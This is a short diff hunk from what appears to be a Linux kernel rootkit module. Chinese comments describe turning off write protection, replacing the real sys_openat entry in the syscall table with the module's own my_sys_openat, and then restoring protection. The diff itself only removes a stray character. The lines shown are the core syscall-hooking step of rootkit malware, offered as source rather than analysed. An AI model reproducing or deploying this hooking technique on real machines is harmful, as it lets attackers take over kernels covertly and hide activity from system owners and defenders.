@@ -26,7 +26,7 @@ static int __init rootkit_init(void)
     // 关闭写保护，将真实的sys_openat函数地址映射到我们自己写的openat函数地址处，偷梁换柱
     disable_wp();
     real_sys_call_table[__NR_openat] = (void *)my_sys_openat;
-    z
+    
     // 恢复现场，打开写保护
     enable_wp();
 
